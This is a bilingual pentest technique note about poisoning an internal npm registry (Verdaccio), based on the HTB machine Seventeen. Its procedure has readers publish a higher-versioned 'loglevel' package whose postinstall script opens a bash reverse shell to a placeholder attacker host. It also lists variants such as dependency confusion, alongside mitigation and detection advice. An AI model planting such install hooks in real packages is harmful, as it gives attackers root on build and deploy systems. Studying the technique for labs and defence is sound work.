---
topic: npm — a malicious module in an internal registry
tags: [linux, npm, supply-chain, postinstall, verdaccio, seventeen]
---

# npm — a malicious module in an internal registry

[🌐 Español](malicious-npm-module.md) | **English**

## Concept

npm runs lifecycle scripts (`preinstall`, `install`, `postinstall`) when installing a package. If an attacker can publish to the registry the victim uses, with the same name and a higher version than a dependency, the next `npm install` runs their code. In a service that installs as root, the result is root execution.

On Seventeen, Verdaccio served internal packages and a `startup.sh` ran `npm install` as root; publishing a malicious `loglevel` with a `postinstall` gave root.

## When it applies

- Internal npm registry reachable with weak authentication.
- The application installs dependencies on every start or deploy.
- `package.json` uses ranges (`^`, `~`) and there is no integrity-checked lockfile.
- The install process runs as root.
- On Seventeen, the registry was on `4873` and the startup script ran as root.

## Procedure

1. Identify the registry (`npm config get registry`, `.npmrc`, `4873`).
2. Check whether it allows unauthenticated publishing.
3. Create a package with a dependency's name and a higher version.
4. Add a `postinstall` that runs the payload.
5. Publish and wait for the next `npm install`.
6. Verify execution and the reverse shell.

## Commands

```bash
npm config set registry http://127.0.0.1:4873/
npm whoami
```

```json
{
  "name": "loglevel",
  "version": "99.9.9",
  "scripts": {
    "postinstall": "bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'"
  }
}
```

```bash
npm publish --registry http://127.0.0.1:4873/
```

## Variants

- Dependency confusion: publish a private package's name to the public registry.
- `preinstall` to run before dependency resolution completes.
- Modify a legitimate package if the registry allows overwriting versions.
- Use `node -e` in the script to avoid depending on `bash`.

## Limitations

- The registry may require authentication to publish.
- A lockfile with `integrity` prevents version changes.
- `npm ci` and `--ignore-scripts` block the `postinstall`.
- The published version must satisfy the dependency range.

## Mitigation

- Authenticate and authorise publishing to the internal registry.
- Use lockfiles with `integrity` and `npm ci`.
- Run `npm install --ignore-scripts` where possible.
- Install as an unprivileged user in an ephemeral container.
- Audit dependencies and monitor new publications.

## Detection

- New packages or anomalous versions in the registry.
- `postinstall` scripts running shells or downloading binaries.
- `npm install` as root and unexpected child processes.
- Outbound connections during installation.

## References

- [npm — Lifecycle scripts](https://docs.npmjs.com/cli/v10/using-npm/scripts#life-cycle-scripts)
- [Verdaccio — Security](https://verdaccio.org/docs/security/)
- [0xdf — Seventeen](https://0xdf.gitlab.io/2026/02/14/htb-seventeen.html)
- [Seventeen writeup](../../machines/linux/seventeen/README.en.md)
